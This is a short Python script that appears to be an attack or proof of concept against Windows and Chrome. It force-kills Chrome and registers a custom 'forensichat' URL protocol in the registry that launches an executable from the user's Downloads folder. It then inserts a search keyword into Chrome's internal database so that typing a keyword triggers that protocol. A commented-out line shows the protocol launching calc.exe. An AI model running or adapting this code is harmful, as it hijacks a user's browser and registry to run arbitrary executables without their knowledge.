import _winreg as wreg
import getpass
import os
import sqlite3 as lite

#add custum url header to registry
def reghead():
	user = getpass.getuser()
	key = wreg.CreateKey(wreg.HKEY_CLASSES_ROOT, '')
	wreg.SetValue(key,'forensichat',wreg.REG_SZ,'URL:forensichat Protocol')
	kkey = wreg.CreateKey(wreg.HKEY_CLASSES_ROOT, 'forensichat')
	wreg.SetValueEx(kkey, 'URL Protocol', 0, wreg.REG_SZ,'')
	wreg.CreateKey(wreg.HKEY_CLASSES_ROOT,"forensichat\shell")
	nkey = wreg.CreateKey(wreg.HKEY_CLASSES_ROOT,"forensichat\shell\open")
	wreg.SetValue(nkey,"command",wreg.REG_SZ,'C:\Users\\'+user+'\Downloads\\forensiclean+.exe')
	key.Close()
	nkey.Close()
	kkey.Close()

#shutdown chrome
def killchrome():
	os.system("taskkill /F /IM chrome.exe")

#start sql stuff
def addcustombrowser():
	con = lite.connect('C:\Users\steal\AppData\Local\Google\Chrome\User Data\Default\Web Data')
	c = con.cursor()
	#idmax = c.execute('SELECT MAX(id) FROM keywords')
	#c.execute("INSERT INTO keywords  VALUES ('cleanupeverybodyeverywhere','cleanupeverybodyeverywhere','','forensichat://C:>Windows>System32>calc.exe',0,'',0,0,'',0,'',0,0,'',0,'','','','','','','','','')")
	c.execute("SELECT * FROM keywords WHERE short_name='cleanupeverybodyeverywhere'")
	foo = c.fetchall()
	if foo == []:
		c.execute("INSERT INTO keywords (short_name,keyword,url,favicon_url) VALUES ('cleanupeverybodyeverywhere','cleanupeverybodyeverywhere','forensichat://','')")
		con.commit()
	con.close()
	# prints (u'testvalue', 1)

def main():
	killchrome()
	reghead()
	addcustombrowser()

if __name__ == "__main__": main()